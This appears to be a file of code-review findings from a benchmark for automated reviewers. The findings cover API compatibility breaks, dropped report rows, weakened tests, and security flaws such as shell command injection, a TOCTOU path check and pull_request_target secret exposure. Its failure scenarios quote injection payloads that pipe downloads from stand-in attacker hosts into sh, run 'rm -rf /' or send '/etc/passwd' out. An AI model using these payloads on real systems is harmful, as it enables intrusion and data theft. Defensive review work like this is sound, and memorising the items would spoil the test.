findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body:
category: intent
The commit claims to "keep fetch_user backward compatible", but this line drops the `timeout: int = 30` default and changes the return type from `dict[str, object]` to `tuple[dict[str, object], int]`. Any existing caller that invokes `fetch_user("id")` without the timeout argument now raises TypeError, and callers that treated the result as a dict (e.g. `result["id"]`) now get tuple indexing semantics instead. The stated intent is not fulfilled by this signature change.
findings.failure_scenario: Existing callers passing only user_id raise TypeError: fetch_user() missing 1 required positional argument: 'timeout'; callers unpacking the dict payload iterate tuple indices and get wrong values or errors.
findings.suggestion:
def fetch_user(user_id: str, timeout: int = 30) -> dict[str, object]:
    return {"id": user_id, "fetched_at": datetime.utcnow(), "timeout": timeout}
findings.title: Make timeout default and return type match old signature

findings.body:
category: correctness
`datetime.utcnow()` returns a timezone-naive datetime, whereas the previous code returned an aware datetime via `datetime.now(UTC)`. Naive and aware datetimes cannot be compared or subtracted in Python, so any downstream code that mixes this `fetched_at` value with aware datetimes will raise TypeError. `datetime.utcnow()` is also deprecated since Python 3.12.
findings.failure_scenario: A caller computes `result["fetched_at"] - datetime.now(UTC)` and gets TypeError: can't subtract offset-naive and offset-aware datetimes.
findings.title: Return timezone-aware datetime instead of naive utcnow()

findings.body: `PurePath` is an alias for `PureWindowsPath` on Windows and `PurePosixPath` elsewhere, so the same user_id is normalized differently depending on the OS: on Windows "a\\b" collapses to "b", on POSIX it does not. findings.body: renderReport interpolates the caller-supplied userName directly into a string that is handed to execSync, which runs the string through a shell. Unlike the previous spawnSync(..., ["--user", userName]) call, no argument array or escaping is used, so any shell metacharacters in userName (;, &&, |, $(...), backticks, newlines) are interpreted by /bin/sh. This is OS command injection: an attacker who can influence the userName argument can execute arbitrary commands with the privileges of the Node process. Validate userName against a strict allow-list (e.g. /^[\w.-]+$/) or pass the value as an argv element instead of through a shell.
findings.failure_scenario: An attacker supplies a userName such as `alice; curl attacker.example/x | sh`. The constructed string `report --user alice; curl attacker.example/x | sh` is executed by the shell, running the attacker's command on the host with the application's privileges.

findings.body: The spec requires that report commands avoid shell interpretation, but this change builds a single string, `report --user ${userName}`, and runs it through `execSync`, which spawns a shell. Any `userName` containing shell metacharacters (spaces, quotes, `;`, `$(...)`) is interpreted by the shell — enabling command injection and causing usernames with spaces to fail outright. The previous `spawnSync("report", ["--user", userName], ...)` passed arguments directly without a shell; restore that property with `execFileSync` (or keep `spawnSync`).
findings.failure_scenario: A caller passes userName `a; rm -rf /` (or even just `John Doe`); execSync routes the string through a shell, so the injected command runs (or the report command fails on the unquoted space), violating the shell-interpretation requirement and allowing arbitrary command execution.
findings.title: Use execFileSync instead of execSync to avoid shell interpretation

findings.anchor: export function fetchUser(id: string, timeoutMs: number): [Record<string, unknown>, number] {
findings.body: The commit claims to 'retain fetchUser compatibility', but the signature change does the opposite: the `timeoutMs = 30_000` default is dropped (making the argument mandatory) and the return type changes from a plain object to a tuple `[Record<string, unknown>, number]`. Every existing caller that invoked `fetchUser(id)` without a timeout now fails to compile, and every caller that read `result.id` / `result.timeoutMs` / `result.fetchedAt` as object properties breaks, since the fields are now positional tuple elements. This is an API-breaking rewrite, not a compatibility-preserving refactor.
findings.failure_scenario: An existing caller writes `const u = fetchUser('abc'); u.id` (previously valid): the call now fails type-checking for the missing argument, and code that passed a timeout gets a tuple back, so property access like `u.id` evaluates to undefined or raises, breaking downstream consumers.
findings.title: Restore the default param and object return to keep compatibility

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: `fetchedAt` was produced with `toISOString()`, which emits ISO 8601 with millisecond precision (e.g. `2024-10-15T08:00:00.000Z`). The change to `toGMTString()` — a deprecated Annex B alias of `toUTCString()` — emits an RFC 7231 date such as `Tue, 15 Oct 2024 08:00:00 GMT`, silently changing the wire format and discarding milliseconds. findings.body: renderReport now builds a shell command by interpolating userName directly into a string passed to execSync, which runs it through /bin/sh. The previous spawnSync("report", ["--user", userName]) invocation passed userName as an argv element and never involved a shell, so this is a newly introduced injection sink. Any attacker-influenced userName containing shell metacharacters (e.g. `;`, `&&`, backticks, $(...)) is executed with the privileges of the process. Prefer keeping the non-shell spawn form, or at minimum pass execSync an argv array via the shell:false form / spawnSync.
findings.failure_scenario: A caller passes userName = "alice; curl attacker.com/x | sh"; execSync runs it via the shell, executing the attacker's command on the host.
findings.suggestion:

  if (status !== 0) throw new Error(`report exited with status ${status}`);
findings.title: Fix OS command injection via userName in execSync

findings.body: Switching the import from spawnSync to execSync means the command string is handed to a shell rather than executed directly with an argument array. Combined with the interpolated userName, this removes the argument-vector safety the old code had. If the shell call must stay, escape/validate userName or use spawnSync with an argv array.

findings.body: Applying toLowerCase() before the query means the database now receives a lowercased identifier. If ids are case-sensitive in the backing store (case-sensitive strings, mixed-case UUIDs, external ids), lookups for ids containing uppercase letters will no longer match their stored value, and if two distinct ids differ only by case they collide — the query can return the wrong user's row. If ids are not case-insensitive by schema contract, normalization should be removed or applied consistently at write time as well.

findings.body: The `user` argument is interpolated into a single string with `format!` and then executed through `sh -c`, so any shell metacharacters in `user` are interpreted by the shell. The previous implementation passed `user` as a discrete argv element via `Command::new("report").args([...])`, which is not shell-interpreted. This reintroduces OS command injection (OWASP A03 Injection): an attacker who controls `user` can append `;`, `&&`, backticks, `$()`, or newlines and run arbitrary commands as the process's user. Pass the arguments directly instead of going through a shell; if the intermediate string is genuinely needed, keep `Command::new("report")` and split it safely without `sh -c`.
findings.failure_scenario: A caller passes user = `alice; rm -rf /` (or `$(curl attacker.example|sh)`); `sh -c "report --user alice; rm -rf /"` executes the attacker's command with the application's privileges instead of merely running `report`.
findings.title: Fix OS command injection via sh -c string interpolation

findings.body: `rows.into_iter().skip(1).collect()` drops element 0 of the input, so `render_report` no longer returns all the rows it was given. This directly contradicts the stated intent "preserve report rows for named users" — the previous code returned `rows` unchanged, and nothing in the change explains why the first row should be lost.
findings.failure_scenario: A caller passes `vec!["first", "second"]` expecting both rows in the report; the function returns only `["second"]`, and the first row is silently missing from the generated report.
findings.title: Remove skip(1); it silently discards the first report row

findings.body: The spec's acceptance criterion is that rendering preserves every row. The previous assertion checked exact equality with the full input; the replacement only asserts the result is non-empty, so it passes even though `render_report` now drops the first row. The test no longer detects the regression the spec requires it to cover, and renaming it from `preserves_rows` to `returns_rows` hides what behavior is being specified.
findings.failure_scenario: A regression that removes or reorders rows still passes CI: `vec!["first", "second"]` returning `vec!["second"]` satisfies `!is_empty()`, so the row-preservation guarantee is never enforced.
findings.title: Weaken the row-preservation test to a non-empty check

findings.body: The diff replaces the single batched `repo.load_many(ids)` call with a loop that invokes `repo.load(*id)` once per input id. Against a change billed as an efficiency design, this is an N-1/N+1 loading regression. findings.body: `VecFactory::create` returns `Vec::new()`, which allocates nothing up front, so `results.push` grows the buffer through repeated reallocations and element copies as capacity doubles. findings.body: std::mem::uninitialized::<UserRecord>() is instant undefined behavior in Rust: it produces a value whose bytes may be anything, and merely creating it (before any branch or read) is UB if UserRecord has any invalid bit-patterns — bool, enum, NonNull, or a reference. The uninitialized scratch is then passed to UserRecord::merge, so those garbage bytes are read and copied into the returned record. In a safe-language context this is a memory-safety hole: the compiler may miscompile the surrounding code, and the caller receives a UserRecord built from indeterminate memory. The deprecated function has been removed from newer editions for exactly this reason; construct the record properly instead.
findings.failure_scenario: fetch_user is called with any arguments; std::mem::uninitialized produces indeterminate bytes for scratch, reading them is UB, and depending on optimization the compiler may assume the path unreachable or the returned UserRecord may contain garbage field values, leading to crashes or attacker-influenced data downstream.
findings.title: Remove std::mem::uninitialized to avoid undefined behavior

findings.body: The commit states the goal is to "keep fetch_user source compatible", but the change alters the public signature in two breaking ways: `timeout_ms` changes from `Option<u64>` to `u64`, so existing callers passing `None` or omitting the default no longer compile, and the return type changes from `UserRecord` to `(UserRecord, u64)`, so existing callers that destructure or return the record directly no longer compile. The former `timeout_ms.unwrap_or(30_000)` default is also gone, so no default timeout applies anymore and the passed-in value is simply echoed back rather than used. None of this is compatible with the stated intent.
findings.failure_scenario: Any existing caller of `fetch_user(id, None)` or code that assigns the returned `UserRecord` directly fails to compile (or, after being force-updated, silently loses the 30-second default timeout behaviour).
findings.title: Restore the original fetch_user signature to keep it source compatible

findings.body: The containment check is performed on the result of `canonicalize()`, but the file is then opened by re-resolving the same path string afterwards. Between the `strip_prefix` validation and `File::open(candidate)`, any component of `candidate` (all of which live inside `root`, typically writable by the same party supplying `name`) can be replaced with a symlink pointing outside `root`. `File::open` follows the new symlink, so the validated path is not the path actually opened — the traversal guard is a check-then-act sequence and is bypassable. If there is no concurrent-writer threat model for `root`, this is acceptable, but as written the check gives a false guarantee; a race-free version needs to open relative to a directory handle (e.g. `openat`-style, or `std::os::fd` + `openat2` with `RESOLVE_BENEATH`) rather than canonicalize-then-open.
findings.failure_scenario: An attacker who can write inside `root` (or inside any directory component of `candidate`) swaps a directory component of `candidate` for a symlink to `/etc/shadow` after `canonicalize()`/`strip_prefix()` run but before `File::open(candidate)` executes; the open follows the fresh symlink and returns a file outside `root`, defeating the containment check.
findings.title: Close the TOCTOU gap between canonicalize check and File::open

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

findings.body: Building `report --user $user` via string interpolation and handing it to `sh -c` makes the shell parse the `user` value, so any metacharacters it contains are executed as shell syntax. The previous code passed `user` through the argv list, which never invokes a shell. Restoring the list form also leaves the `command` variable on the line above unused, so that line should be removed with it.

findings.title: Pass user as an argument instead of interpolating into sh -c

findings.body:
The original implementation returned `repository.loadMany(ids)` directly, i.e. one result per requested id. The new loop only appends an item when `item.active` is true, `item.owner` is non-null, and `owner.enabled` is true, so items failing any of these checks vanish from the returned list. Any caller that correlates results back to `ids` positionally (or expects `results.length == ids.length`) will now get short lists and misaligned data. If this filtering is intended, it is a new contract not described by the change; if not, the filters should be dropped or the unfiltered item forwarded.

(Note: `category`: "correctness")
findings.failure_scenario: A caller passes ids [a, b, c] where b's item is inactive or has a null/disabled owner; `enrich` returns only 2 items, so index-based zipping of results with the input ids associates c's item with b's id, producing wrong downstream results.
findings.title: Stop silently dropping ids whose item fails the filters

findings.anchor: final item = await repository.load(id);" (verbatim: `    final item = await repository.load(id);`)
findings.body: The function previously delegated to repository.loadMany(ids), a single batched fetch. It now issues one repository.load(id) await per element in the loop, so the number of repository round-trips scales linearly with the input size. The filtering logic (active, owner enabled) could be applied to the results of one loadMany call instead.
findings.failure_scenario: When enrich is called with a large id list, each id triggers its own repository lookup, multiplying latency by the list length and potentially exhausting the underlying connection/query pool compared to the previous single batched load.
findings.suggestion:
final items = await repository.loadMany(ids);
  return items.where((item) => item.active && item.owner?.enabled == true).toList();
findings.title: Restore the batched loadMany call

findings.body: `enrich`'s contract changed materially: it no longer returns every item the repository can load, it returns only active items whose owner is enabled, and it now loads items one at a time instead of batching via loadMany. As an exported/top-level function, this behavior should be stated in a doc comment so callers know that ids can be silently dropped from the result and that loading is now sequential.
findings.title: Document that enrich now filters items

findings.anchor: (Map<String, Object?>, int) fetchUser(String id, int timeoutMs) {
findings.body: The commit states "keep fetchUser callers compatible", but the change breaks compatibility on two axes. The second parameter `timeoutMs` lost its optional marker and default (`[int timeoutMs = 30000]` → `int timeoutMs`), so any caller invoking `fetchUser(id)` now fails to compile with a missing-argument error. The return type changed from `Map<String, Object?>` to a record `(Map<String, Object?>, int)`, so existing callers that read `result['id']`, spread the map, or pass it to a `Map`-typed parameter now fail to compile or get wrong values. Additionally, `fetchedAt` was dropped from the payload, so consumers relying on that key get nothing. If the new contract is intended, the callers must be migrated in this PR; otherwise keep the old signature.
findings.failure_scenario: Any existing call site `fetchUser(id)` or `fetchUser(id, 30000)` followed by map access such as `user['id']` breaks at compile time — missing required argument and record-vs-Map mismatch — contradicting the stated intent of keeping callers compatible.
findings.title: Restore fetchUser signature to keep callers compatible

findings.body: The function now returns a `(Map, int)` tuple instead of a plain `Map<String, Object?>`. Any caller that treats the result as a map — indexing, `jsonEncode(result)`, passing to a `Map`-typed API, or spreading — no longer type-checks, and the `timeoutMs` value is now only reachable through record destructuring rather than `result['timeoutMs']` as before. This is a contract change beyond "keep callers compatible" and needs either callers updated alongside it or a revert to the map-returning contract.
findings.failure_scenario: A caller doing `jsonEncode(fetchUser(id))` or `fetchUser(id)['id']` fails to compile after this change, so the refactor does not deliver the promised drop-in compatibility.
findings.title: Return value is now a record; map consumers break

findings.body: The change folds `userId` to lower case before the lookup. If user IDs are stored case-sensitively (mixed-case UUIDs, case-sensitive usernames, or external identifiers), two distinct IDs that differ only in case now normalize to the same value, so the query resolves to whichever row matches the lower-cased form. That lets a caller presenting ID `Abc123` receive the row for `abc123`, i.e. another user's record, or silently receive no row for a legitimately mixed-case ID. The parameterization itself is fine — this is a normalization/authz concern, not injection. Confirm whether IDs are case-insensitive before merging; if they are case-sensitive, only trim, or normalize at ID creation time instead of at query time.

findings.body: The render method now runs the report binary through a shell ("/bin/sh", "-c", "report --user " + user), so the untrusted `user` value is interpreted by sh rather than passed as a single argv element. Any shell metacharacters in `user` (;, &&, `, $(), |, newline) are executed with the privileges of the service process. The previous ProcessBuilder form passed user as a discrete argument and was not shell-interpreted, so this change introduces OS command injection where none existed.
findings.failure_scenario: An attacker supplies a username such as `alice; curl attacker.example/$(cat /etc/passwd)` (or `alice`$(malicious)`). The service builds `sh -c 'report --user alice; curl ...'`, the shell executes the attacker's command, and arbitrary code runs on the host — exfiltrating files, launching reverse shells, or tampering with report data.
findings.title: Stop concatenating user into a /bin/sh -c command string

findings.body: `rows.subList(1, rows.size())` discards the first element of the input, so the first row (often a header or the first data record) never reaches the caller. This directly contradicts the stated intent to "preserve report rows". It also throws `IndexOutOfBoundsException` when `rows` is empty, because `subList(1, 0)` has `fromIndex > size`. Category: intent.
findings.failure_scenario: A caller renders a report with rows `["first", "second"]` and receives only `["second"]`, silently losing data; with an empty row list the call throws `IndexOutOfBoundsException` instead of returning an empty list.
findings.title: Return all rows instead of dropping the first one

findings.body: The new filter binds `userId.trim().toLowerCase()`, which alters the caller's value before comparison. If user IDs are stored with their original case (or with significant leading/trailing whitespace semantics), the bound value no longer matches the stored key, so the query returns no rows for an ID that exists. The default-locale `toLowerCase()` is also locale-dependent (e.g. Turkish locale maps 'I' to 'ı'), so the same ID can be transformed differently across environments. The previous code ignored `userId` entirely, so this normalization is a new behavioural assumption that is not part of the stated intent.
findings.failure_scenario: A user with stored ID `User_42` is looked up: the bound parameter becomes `user_42`, the equality predicate fails, and `find` returns an empty ResultSet instead of that user's row — a silent lookup miss.
findings.title: Do not normalize userId before binding it to the query

findings.body: `find` allocates a `PreparedStatement` locally and returns only the `ResultSet`. Closing a ResultSet does not close its Statement, and the caller has no reference to the statement, so nothing in this contract can release it short of closing the whole connection. Repeated calls on a long-lived connection accumulate open statements (and, depending on driver, server-side cursors). Closing the statement here is not possible without also closing the returned ResultSet, so the fix is structural: return the statement alongside the result set, or restructure the API so the caller owns the statement in try-with-resources.
findings.failure_scenario: A request handler loops over many IDs on a pooled connection; each `find` call leaks one PreparedStatement, and the driver/connection exhausts its statement limit or leaks server-side resources until queries start failing.
findings.title: PreparedStatement is never closed by this method

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: Concatenating `user` into the `sh -c` command string makes the argument subject to shell parsing, whereas the previous form passed it as an argv element that no shell ever parses. `Render` is exported and takes `user` from its caller, so any value containing `;`, `&&`, backticks, or `$(...)` executes arbitrary commands with the process's privileges instead of merely passing a username. This execution-form change is also unrelated to the commit's stated goal of preserving report rows.
findings.failure_scenario: A caller invokes Render with user `alice; curl http://evil/x | sh`; `sh -c` executes that payload, running attacker-supplied commands rather than only `report --user alice`.
findings.title: Pass user as a separate argv element, not shell text

findings.body: The spec states rendering shall preserve every row, but `return rows[1:]` discards the first element. Any caller rendering a report silently loses its leading row (and for a zero- or one-row input the result is empty). Return the slice unchanged.
findings.failure_scenario: Render is called with rows ["first","second"]; it returns ["second"], so the rendered report is missing its first row and a one-row input renders nothing.
findings.title: Drop the first row, violating the preserve-every-row spec

findings.body: The test was narrowed from checking that both rows survive (`len(got) != 2 || got[0] != "first"`) to checking only that the result is non-nil, and the name changed from `TestRenderPreservesRows` to `TestRenderReturnsRows`. It now passes even though `Render` discards `rows[0]`, so the exact regression the commit claims to fix ships with a green suite.
findings.suggestion: if got := Render("alice", []string{"first", "second"}); len(got) != 2 || got[0] != "first" { t.Fatal(got) }
findings.title: Assert preserved contents, not just a non-nil result

findings.body: `ioutil.ReadFile("defaults.json")` is executed on every FetchUser call, but both the file contents and the error are explicitly discarded (`_, _ =`). The I/O has no observable effect on the returned values, while still incurring a filesystem read (and an open file handle) per call, and any failure — a missing or unreadable file — is silently swallowed so it can never be diagnosed. Either the data should be used and the error handled/propagated, or the read should be removed entirely.
findings.failure_scenario: If defaults.json is missing or unreadable, FetchUser keeps returning normally and nobody ever learns the load failed; meanwhile every call pays a wasted disk read that returns data no one consumes.
findings.title: Discard the pointless defaults.json read, not just its error

findings.body: Switching to `pull_request_target` makes this job run in the base repository's context with access to secrets, while the added `ref:` override checks out the PR head commit and `npm test` executes scripts and dependencies from that untrusted tree with `RELEASE_TOKEN` in its environment. A pull request from any fork can therefore run arbitrary code that reads and exfiltrates the token; the `contents: read` permission only scopes the job's GITHUB_TOKEN and does not restrict repository secrets, and a token named RELEASE_TOKEN presumably carries publish/release scope. The `ref:` override and the new `env:` block are only dangerous in combination with this trigger, so reverting the trigger is the single fix — otherwise keep `pull_request_target` but check out the base ref and never expose secrets to a step running PR-controlled code.
findings.failure_scenario: An attacker opens a fork PR that rewrites the package.json test script to POST process.env.RELEASE_TOKEN to a server they control; the pull_request_target workflow fires on the PR, checks out the attacker's head commit, runs npm test, and the release token is leaked, allowing publishing/releasing as the token's owner.
findings.title: Revert to pull_request: target trigger hands RELEASE_TOKEN to PR code

findings.body: Checking out github.event.pull_request.head.sha places attacker-controlled source in the workspace of a workflow that has access to RELEASE_TOKEN. The subsequent npm test then executes the PR's code and scripts with that secret in the environment. If this workflow must remain on pull_request_target, check out the base branch only, or fork PRs and run untrusted code without any secrets.
findings.failure_scenario: A PR from a fork changes package.json test scripts; checkout fetches the attacker's commit and npm test runs their payload, which reads process.env.RELEASE_TOKEN and sends it to an attacker-controlled server.
findings.title: Do not check out untrusted PR head in a secret-bearing workflow

findings.body: The env block injects a release-capable secret into `npm test`, which now executes the checked-out PR head's scripts. Any value readable from the test process (`process.env`, a malicious test file, a lifecycle script) can be read or exfiltrated by the PR author. Delete these two lines (the `env:` block) unless the job is restricted to trusted, non-fork code.
findings.failure_scenario: A contributor's PR adds a test that reads `process.env.RELEASE_TOKEN` and posts it to an external endpoint; the workflow grants the secret to that step, so the token is disclosed and can be used to publish releases.
findings.title: Remove RELEASE_TOKEN from the step that runs untrusted PR code

expected.label: pull_request_target executes untrusted head with a secret

findings.body: This workflow now runs in the `pull_request_target` context, so it executes with a GITHUB_TOKEN that has `pull-requests: write` against the base repository on every pull_request event, including those from forks. The newly added `actions/labeler@v6` is referenced by a mutable tag rather than a full commit SHA (as is the existing `actions/checkout@v4` on the preceding line). Anyone who can retarget that tag — via a compromised maintainer account or an upstream supply-chain breach — gains code execution with that write-capable token for all incoming PRs. Pin both actions to full-length commit SHAs (the SHA pins can be taken directly from the upstream releases) so the privileged workflow cannot silently start running different code.
findings.failure_scenario: An attacker retargets the `v6` tag on the labeler repository to a malicious commit; every subsequent PR (from any fork) runs that code with a token holding `pull-requests: write` in the base repo, allowing label manipulation, PR state changes, or comment/ review posting as the workflow identity.
findings.title: Pin actions to commit SHAs in this privileged workflow

findings.body: category: intent. The stated intent ("plant github-actions-clean-context-v1") says nothing about changing CI triggers or workflow permissions, yet the diff rewrites the workflow trigger from `pull_request` to `pull_request_target` and grants `pull-requests: write`. A `pull_request_target` workflow runs in the base repository's context with a token that can write to the repo's PRs even for fork contributions, so silently introducing it alongside a permissions grant is a security-relevant out-of-scope change that must be explicitly justified in the PR description. Note the accompanying `actions/checkout@v4` on `pull_request_target` checks out the base ref, which limits the risk, but the trigger/permission change still warrants explicit sign-off rather than arriving unmentioned.
findings.failure_scenario: The PR is merged on the strength of an intent message that does not mention workflow triggers; the label workflow now executes with a write-capable token on `pull_request_target` events, expanding the attack surface for every future PR event without reviewer awareness.
